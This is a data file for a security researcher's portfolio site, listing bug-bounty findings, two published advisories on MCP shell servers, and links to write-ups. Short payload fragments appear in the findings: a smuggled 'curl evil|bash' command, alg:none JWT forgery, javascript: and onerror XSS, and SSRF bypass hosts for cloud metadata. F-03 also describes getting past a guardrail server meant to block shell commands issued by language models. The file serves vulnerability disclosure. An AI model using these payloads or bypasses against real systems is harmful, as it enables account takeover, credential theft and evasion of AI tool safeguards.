// ──────────────────────────────────────────────────────────────────────────
//  SINGLE SOURCE OF TRUTH for the site.
//  Everything the page renders — identity, metrics, findings, disclosures,
//  capabilities, writeups, links — lives here. Edit here, nowhere else.
//
//  Rule for this file: every claim is real and defensible. Private-program
//  targets are redacted by class (program confidentiality); public
//  open-source disclosures are named, because they're published.
// ──────────────────────────────────────────────────────────────────────────

export const identity = {
  handle: 'ansh',
  name: 'ANSH',                 // display wordmark
  fullName: 'Ansh Bohara',
  role: 'Security researcher · bug-bounty hunter',
  focus: ['authentication', 'access control', 'server-side request forgery', 'the trust between services'],
  age: 15,
  location: 'remote',
  availability: 'Open to internships, research collaborations & private program invites',
  // rotating one-liners under the name — confident, specific, no filler
  taglines: [
    'I break authentication, access control, and the trust between services.',
    'Impact is the only currency — every finding ends in "…which lets an attacker…".',
    'alg:none → full account takeover. Two GitHub Security Advisories. One paid bounty, so far.',
    'Depth over breadth. I would rather own one endpoint than lightly poke fifty.',
    'Low + low = critical. The real question is always: what does this unlock?',
    '15 years old. The work is the flex, not the age.',
  ],
}

// Hero metric row. Each is verifiable from the findings/disclosures below.
export const metrics = [
  { value: 2,  label: 'Critical-severity findings', sub: 'account & tenant takeover' },
  { value: 2,  label: 'Public security advisories', sub: 'GHSA · MCP ecosystem' },
  { value: 17, label: 'Vulnerabilities documented', sub: 'across H1 · YWH · Bugcrowd' },
  { value: 15, label: 'Years old',                  sub: 'started young, kept going' },
]

// First-person, blunt, technical. This is the pitch an interviewer reads.
export const about = `I'm Ansh — a 15-year-old security researcher. Not a scanner operator,
not a checklist auditor. I get paid per real, exploitable bug, so impact is the only
thing I chase, and every hypothesis I chase has to finish the sentence "…which lets an
attacker read, move, or take over something that isn't theirs."

The method is deliberately boring. Map the auth model first — roles, tenants, how
sessions and tokens actually work. Form a theory about the corner a developer cut under
deadline. Test that theory directly, prove it end to end with two accounts, then chain
it: a signature that's never verified, a proxy that trusts its caller, a sanitizer that
forgot URL schemes exist. Low plus low equals critical.

So far that's turned into two critical account-/tenant-takeovers, two published GitHub
Security Advisories in the MCP ecosystem, and a stack of validated findings across
HackerOne, YesWeHack and Bugcrowd. The payout history is early — first bounty just
landed. The report quality isn't waiting for permission.`

// "How I work" — the differentiator. Shown as a compact numbered rail.
export const approach = [
  {
    k: 'MAP',
    title: 'Model the auth boundary first',
    body: 'Before any payload: who are the roles, where are the tenant lines, how do sessions and tokens really get minted and checked. Bugs live where that model is only half-enforced.',
  },
  {
    k: 'HYPOTHESIZE',
    title: 'Theory before tooling',
    body: 'A sequential ID, an internal-looking endpoint, a "confidential" secret in a public bundle — each is a testable guess about a shortcut. I test the guess, not a wordlist.',
  },
  {
    k: 'PROVE',
    title: 'Two accounts, clean repro',
    body: 'No "could potentially". I reproduce from scratch, confirm the boundary is actually crossed (account A reads/writes B), and capture the minimum proof a triager can replay in two minutes.',
  },
  {
    k: 'CHAIN',
    title: 'Ask what it unlocks',
    body: 'A medium reported alone is worth less than the critical it becomes. Open redirect + OAuth = token theft. Info leak + SSRF = cloud creds. I chain before I write.',
  },
]

// ── FINDINGS ────────────────────────────────────────────────────────────────
// severity: CRIT | HIGH | MED | LOW. Ordered by severity, then impact.
// `impact` = the money sentence (what the attacker gains).
// `detail` = the mechanism + how it was proven (progressive disclosure).
export const findings = [
  {
    id: 'F-01',
    severity: 'CRIT',
    cls: 'Auth bypass',
    title: 'JWT signature never verified on federated login → full account takeover',
    target: '[ REDACTED ] · European bike-share platform · partner login API',
    impact:
      'Forge a session for any SSO user without ever holding the identity provider’s signing key — full account takeover of every partner-federated (Google Sign-In) user.',
    detail:
      'The federated-login endpoint accepts an OIDC identity token and returns a working session, but never validates the signature. An alg:none token and an RS256 token with deliberately invalid signature were both accepted as long as the iss named a registered issuer. The user is keyed off the JWT sub, so setting a victim’s sub returns the victim’s session. Proven end to end against a program-provided test account.',
    tags: ['JWT', 'alg:none', 'OIDC', 'ATO'],
  },
  {
    id: 'F-02',
    severity: 'CRIT',
    cls: 'SSRF · BAC',
    title: 'Authenticated proxy into internal APIs → cross-tenant credential theft',
    target: '[ REDACTED ] · Q-commerce ad-analytics SaaS · customer dashboard',
    impact:
      'Any dashboard user could pivot through a server-side proxy into 300+ internal endpoints with no tenant checks — reading 240+ customer brands and lifting their live ad-platform tokens and plaintext credentials. Full cross-tenant takeover of ad accounts and spend.',
    detail:
      'Two dashboard endpoints string-concatenated a user-supplied path onto a fixed internal base URL with no allow-list; a trailing # neutralised the forced query param, giving full path control into the internal Monet/Acquisition APIs. Those services trust the gateway and enforce no per-tenant authz, so a demo account with no data of its own read every brand’s auth tokens and stored plaintext platform passwords.',
    tags: ['SSRF', 'BOLA', 'cross-tenant', 'credential-theft'],
  },
  {
    id: 'F-03',
    severity: 'HIGH',
    cls: 'RCE',
    title: 'Security-control bypass → OS command injection in an AI "guardrail" MCP',
    target: 'terminal-guardian-mcp · open-source (npm) · GHSA-3g5w-g292-6vrm',
    impact:
      'Defeat the exact "always blocked" guarantee the product sells: prefix any blocked command with one allowlisted token and it runs — arbitrary OS command execution as the server user (CVSS 8.8; 9.8 unauthenticated over WebSocket).',
    detail:
      'The risk classifier checks a safe-command allowlist before the blocked denylist and returns on first match; the allowlist patterns anchor to the first token only, while the executor hands the whole string to bash -c. So `echo hi && curl evil|bash` classifies SAFE and executes. Published as a coordinated GitHub Security Advisory with PoC and patch.',
    tags: ['RCE', 'CWE-78', 'allowlist-bypass', 'MCP', 'GHSA'],
  },
  {
    id: 'F-04',
    severity: 'HIGH',
    cls: 'RCE',
    title: 'Command-allowlist bypass via argv & shell metacharacters (7-issue advisory)',
    target: 'mcp-shell-server · open-source · GHSA-6rrx-pj43-m9p2',
    impact:
      'Turn a "safe" command allowlist into arbitrary code execution, plus redirection-path escape, pipeline injection, and environment-secret exposure — seven distinct hardening failures in one server.',
    detail:
      'The allowlist validated only argv[0], so an allowed binary (e.g. git) reached exec-capable arguments; pipelines and redirections were passed to a shell that re-parsed metacharacters, and child processes inherited secret env. Reported as a coordinated GHSA; the maintainer’s hardening changes map to the seven issues filed.',
    tags: ['RCE', 'argv-injection', 'MCP', 'GHSA'],
  },
  {
    id: 'F-05',
    severity: 'HIGH',
    cls: 'Stored XSS',
    title: 'Stored XSS via javascript: scheme → org-admin takeover',
    target: '[ REDACTED ] · SaaS analytics dashboard',
    impact:
      'Store script that fires in the app’s own origin, ride the victim’s session, and escalate to org-admin — proven by inviting myself as an admin.',
    detail:
      'The HTML sanitizer blocked <script>/<iframe>/onerror but never validated URL schemes, so `<a href=javascript:…>` stored and executed. It ran in-origin against an authenticated admin, riding the session to a privileged action end to end.',
    tags: ['stored-XSS', 'sanitizer-bypass', 'session-riding', 'ATO'],
  },
  {
    id: 'F-06',
    severity: 'HIGH',
    cls: 'Blind XSS',
    title: 'Blind stored XSS in OIDC name claims → staff session theft',
    target: '[ REDACTED ] · bike-share internal staff panel',
    impact:
      'Payload set in my own profile detonates inside a higher-privilege staff admin panel when staff view my account — steal a staff session or act as staff.',
    detail:
      'The OIDC given_name/name claims were stored raw and rendered unescaped in the internal staff console. A second-order/blind XSS that crosses from an attacker-controlled low-priv value into a privileged viewing context.',
    tags: ['stored-XSS', 'blind-XSS', 'OIDC-injection', 'privesc'],
  },
  {
    id: 'F-07',
    severity: 'HIGH',
    cls: 'Sandbox escape',
    title: 'Path-traversal sandbox escape — arbitrary file read/write',
    target: 'filesystem MCP server · open-source',
    impact:
      'Break the documented sandbox with `../../` and read *and* write any file the server process can reach — outside the directory the product promises to confine you to.',
    detail:
      'Relative paths were never canonicalised against the sandbox root, so traversal sequences resolved outside it. Confirmed both read and write primitives past the boundary.',
    tags: ['path-traversal', 'sandbox-escape', 'file-write', 'MCP'],
  },
  {
    id: 'F-08',
    severity: 'MED',
    cls: 'SSRF',
    title: 'SSRF to AWS metadata via DNS + IPv6 deny-list bypass',
    target: '[ REDACTED ] · event-networking SaaS',
    impact:
      'Reach the cloud metadata service (169.254.169.254) despite a deny-list — the first hop toward cloud credential theft.',
    detail:
      'A server-side photo-URL fetch blocked the literal metadata IP but not `169.254.169.254.nip.io` or the IPv6-mapped `[::ffff:a9fe:a9fe]`, both of which resolve to IMDS. Confirmed the server-side reach via out-of-band interaction.',
    tags: ['SSRF', 'cloud-metadata', 'IPv6', 'deny-list-bypass'],
  },
  {
    id: 'F-09',
    severity: 'MED',
    cls: 'BOLA',
    title: 'GraphQL BOLA — read/inject any user’s trip by tripId',
    target: '[ REDACTED ] · government transport ERP · mobile app',
    impact:
      'Read other users’ trip conversations and inject spoofed messages/notifications into them — no ownership check on the object reference.',
    detail:
      'AppSync GraphQL mutations and subscriptions took a tripId/userId and never checked ownership. Demonstrated cross-user read and write with a clean two-account diff.',
    tags: ['IDOR', 'BOLA', 'GraphQL', 'authz-bypass'],
  },
  {
    id: 'F-10',
    severity: 'MED',
    cls: 'Stored XSS',
    title: 'Stored XSS in embeddable widget — fires for anonymous viewers',
    target: '[ REDACTED ] · maps SaaS · embeddable widgets',
    impact:
      'Script runs for anonymous visitors on every third-party site embedding the widget, in an origin with no CSP.',
    detail:
      'Overlay title/description were stored raw and only encoded client-side, then rendered as HTML in a widget origin with no CSP that auto-loads. `<img src=x onerror=…>` executed on load for unauthenticated viewers.',
    tags: ['stored-XSS', 'embedded-widget', 'no-CSP'],
  },
  {
    id: 'F-11',
    severity: 'MED',
    cls: 'HTML injection',
    title: 'Unsandboxed iframe injection → full-page phishing on a trusted domain',
    target: '[ REDACTED ] · changelog / release-notes SaaS',
    impact:
      'Serve a full-viewport phishing page from the target’s own trusted domain, with their branding around it — unauthenticated visitors see a legitimate-looking login.',
    detail:
      'The post sanitizer allowed `<iframe src=https://…>` with no sandbox attribute. A full-viewport iframe pointed at an attacker page, framed by the real site chrome.',
    tags: ['HTML-injection', 'iframe', 'phishing', 'sanitizer-bypass'],
  },
  {
    id: 'F-12',
    severity: 'MED',
    cls: 'Secrets',
    title: 'Confidential OAuth client secrets shipped in production JS',
    target: '[ REDACTED ] · B2B fintech SPA',
    impact:
      'Two confidential client_id:client_secret pairs sit in the public bundle — usable against the auth server (e.g. token introspection). A "confidential" secret in a public SPA is a public secret.',
    detail:
      'Both credential pairs were base64-encoded in the shipped SPA. Confirmed they belonged to confidential OAuth clients, not public ones.',
    tags: ['secrets', 'OAuth', 'credential-exposure'],
  },
  {
    id: 'F-13',
    severity: 'MED',
    cls: 'Injection',
    title: 'Unauthenticated OData $filter injection in CRM data-hub',
    target: '[ REDACTED ] · B2B dealer/customer CRM proxy',
    impact:
      'A single %27 breaks out of the server’s OData $filter and returns unfiltered records — latent unauthenticated customer-PII dump.',
    detail:
      'User input was slotted directly into `$filter=AccountNumber eq ’{id}’` with no sanitising; quote-breakout returned records outside the intended scope. A typo’d backend hostname limited live impact — reported with that caveat.',
    tags: ['OData-injection', 'filter-bypass', 'unauth'],
  },
  {
    id: 'F-14',
    severity: 'LOW',
    cls: 'SSRF',
    title: 'Unauthenticated SSRF via KML import',
    target: '[ REDACTED ] · maps SaaS',
    impact:
      'Unauthenticated server-side fetch of any URL, following redirects, with no egress allow-list — a confirmed SSRF primitive.',
    detail:
      '`/api/import/kml?url=` fetched arbitrary URLs from the backend, confirmed via out-of-band callback from their cloud IPs. Nothing high-value was reachable internally, so it was reported honestly as the primitive it is.',
    tags: ['SSRF', 'unauth', 'no-allowlist'],
  },
  {
    id: 'F-15',
    severity: 'LOW',
    cls: 'Business logic',
    title: 'Open redirect on the payment domain',
    target: '[ REDACTED ] · bike-share payments',
    impact:
      'The actual payments. host 302s to any external site with no payment — phishing from a trusted payment domain is far more convincing.',
    detail:
      'An unvalidated success_url on the checkout flow redirected off-domain. Trusted-origin phishing / OAuth-token-theft primitive.',
    tags: ['open-redirect', 'payment-domain', 'phishing'],
  },
  {
    id: 'F-16',
    severity: 'LOW',
    cls: 'Business logic',
    title: 'Server-side paywall bypass — mint Pro features for free',
    target: '[ REDACTED ] · maps SaaS',
    impact:
      'Create a real Pro, password-protected map for $0 — the server never re-checked the plan on save.',
    detail:
      'Pro gating was entirely client-side isPaid(). POSTing `secure:true` with a password directly produced a genuine Pro artifact. Client-side checks are decoration.',
    tags: ['business-logic', 'paywall-bypass', 'server-validation'],
  },
  {
    id: 'F-17',
    severity: 'LOW',
    cls: 'Business logic',
    title: 'Email pre-claim → onboarding denial-of-service',
    target: '[ REDACTED ] · event-networking SaaS',
    impact:
      'Attach unverified emails to my account and lock the real owners out of ever registering — a namespace-squatting DoS on onboarding.',
    detail:
      'An attach-email mutation added addresses with no ownership verification, letting an attacker pre-claim other people’s emails into the global namespace.',
    tags: ['business-logic', 'email-verification', 'pre-claim'],
  },
]

// ── PUBLIC DISCLOSURES (open-source, named because they're published) ────────
export const disclosures = [
  {
    id: 'GHSA-3g5w-g292-6vrm',
    pkg: 'terminal-guardian-mcp',
    eco: 'npm · MIT',
    severity: 'HIGH',
    cvss: '8.8',
    title: 'Risk classifier defeated by an allowlisted prefix → OS command injection',
    body: 'An MCP "guardrail" that promises to block dangerous shell commands. Its classifier short-circuits on a first-token allowlist before the denylist ever runs, and the executor pipes the whole string to bash -c — so one allowlisted prefix smuggles any blocked command straight through. CWE-78 via CWE-693. Reported with PoC and a patch; 9.8 when exposed unauthenticated over WebSocket.',
    cwe: 'CWE-78 · CWE-693',
  },
  {
    id: 'GHSA-6rrx-pj43-m9p2',
    pkg: 'mcp-shell-server',
    eco: 'open-source',
    severity: 'HIGH',
    cvss: null,
    title: 'Command-allowlist bypass + six hardening failures',
    body: 'Allowlist validated only argv[0], letting an allowed binary reach exec-capable arguments; add pipeline shell injection, redirection-path escape, environment-secret exposure, missing audit logging and missing execution limits. Seven issues filed in one coordinated advisory; the maintainer’s fixes map to each.',
    cwe: 'CWE-78 · CWE-77',
  },
  {
    id: 'MCP-AUDIT',
    pkg: 'MCP security audit series',
    eco: 'filesystem · k8s · CLI · DB servers',
    severity: 'MED',
    cvss: null,
    title: 'Recurring trust failures across the Model-Context-Protocol ecosystem',
    body: 'The two advisories above came out of a broader audit of AI-tooling MCP servers — the layer that lets language models run real commands. Same pattern everywhere: allowlists that only see the first token, sandboxes that skip path canonicalisation, whitelists that never validate arguments. An emerging attack surface almost nobody is auditing yet.',
    cwe: 'multiple',
  },
]

// ── CAPABILITIES — weighted by ACTUAL finding count, not vibes ───────────────
export const capabilities = [
  { cls: 'Authentication & JWT / OIDC', count: 3, note: 'signature-not-verified → full ATO; blind OIDC-claim XSS into staff' },
  { cls: 'Access control — IDOR / BOLA / BAC', count: 4, note: 'GraphQL BOLA; cross-tenant internal-proxy; function-level bypass' },
  { cls: 'XSS — stored / blind / scheme bypass', count: 4, note: 'javascript: scheme, no-CSP widget, iframe phishing' },
  { cls: 'SSRF & cloud-metadata', count: 3, note: 'deny-list bypass to AWS IMDS; unauthenticated fetch' },
  { cls: 'Command injection / RCE (MCP)', count: 3, note: 'two published GHSA advisories; allowlist short-circuit' },
  { cls: 'Business logic', count: 3, note: 'server-side paywall bypass; open redirect; pre-claim DoS' },
  { cls: 'Secrets & info disclosure', count: 2, note: 'confidential OAuth secrets in prod JS; plaintext creds' },
]

export const tools = [
  'Burp Suite', 'Caido', 'ffuf', 'nuclei', 'subfinder', 'httpx',
  'katana', 'gau', 'arjun', 'jwt_tool', 'jadx', 'sqlmap',
  'amass', 'dnsx', 'gf', 'interactsh',
]

// ── WRITEUPS — real, published on Medium (@anshbohra10). status: 'live' | 'draft'
export const writeups = [
  {
    title: 'I Made OpenID Connect Stop Checking Signatures',
    kind: 'writeup',
    status: 'live',
    blurb:
      'The critical account-takeover in full: a federated-login endpoint on a European bike-share platform that never verified the JWT signature, a four-line forgery script that minted a session for any SSO user — and the cruelest word in bug bounty, "duplicate".',
    href: 'https://medium.com/@anshbohra10/i-made-openid-connect-stop-checking-signatures-and-got-paid-0-for-it-32510d8cbcf0',
  },
  {
    title: 'Sensitive Data Exposure on Screenly’s API',
    kind: 'writeup',
    status: 'live',
    blurb:
      'From a random ULID in a network tab to plaintext device PINs — a full walkthrough of an access-control gap on a digital-signage platform that manages screens in the physical world.',
    href: 'https://medium.com/@anshbohra10/how-i-found-sensitive-data-exposure-on-screenlys-api-a-bug-bounty-writeup-c21dc7c57d40',
  },
  {
    title: 'The Confidential Secret With the Discretion of a Billboard',
    kind: 'writeup',
    status: 'live',
    blurb:
      'A bank-grade SaaS shipped its confidential OAuth client secret to every browser that loaded the page. What a "confidential" client actually is, why this quietly breaks the trust model, and how it was disclosed without naming anyone.',
    href: 'https://medium.com/@anshbohra10/the-confidential-secret-with-the-discretion-of-a-billboard-0ac48a06df09',
  },
  {
    title: 'The Bouncer Who Never Read the Envelope',
    kind: 'writeup',
    status: 'live',
    blurb:
      'A meticulous HTML sanitizer checked every tag and attribute — then waved a link through without once asking where it pointed. How one missing scheme check turns a shared dashboard into someone else’s session.',
    href: 'https://medium.com/@anshbohra10/the-bouncer-who-never-read-the-envelope-e9b580846fa9',
  },
  {
    title: 'The Bouncer Who Frisked Everyone and Forgot to Lock the Door',
    kind: 'writeup',
    status: 'live',
    blurb:
      'A changelog widget’s sanitizer strips every XSS vector you can name — then hands you a full-page iframe on its own trusted domain. A study in the security control I’ve come to love: the one that checks everything except the thing that matters.',
    href: 'https://medium.com/@anshbohra10/the-bouncer-who-frisked-everyone-and-forgot-to-lock-the-door-4d68dcde76e1',
  },
  {
    title: 'Eight People, One Door, Everybody In',
    kind: 'writeup',
    status: 'live',
    blurb:
      'Qdrant Cloud is one of the tightest control planes I’ve thrown myself at. The only crack, after days of bouncing off it: a free-tier quota check that counted heads one at a time — a race at the velvet rope. A respectful disclosure story.',
    href: 'https://medium.com/@anshbohra10/eight-people-one-door-everybody-in-a-race-at-the-velvet-rope-9d9a3c1015a6',
  },
  {
    title: 'The Bug I’m Proudest Of Is the One I Deleted',
    kind: 'essay',
    status: 'live',
    blurb:
      'Three real findings on ScribbleMaps — and the SSRF I talked myself out of with a stopwatch. On the only bug-bounty skill that compounds: proving yourself wrong before a triager has to.',
    href: 'https://medium.com/@anshbohra10/the-bug-im-proudest-of-is-the-one-i-deleted-f5d4247232e9',
  },
]

export const social = [
  { label: 'github',   handle: '@GOJO-SENPA1',        href: 'https://github.com/GOJO-SENPA1' },
  { label: 'linkedin', handle: 'in/ansh-bohara',      href: 'https://www.linkedin.com/in/ansh-bohara-47169a344/' },
  { label: 'medium',   handle: '@anshbohra10',        href: 'https://medium.com/@anshbohra10' },
  { label: 'twitter',  handle: '@AnshBohra08975',     href: 'https://x.com/AnshBohra08975' },
  { label: 'email',    handle: 'anshbohara10@proton.me', href: 'mailto:anshbohara10@proton.me' },
]
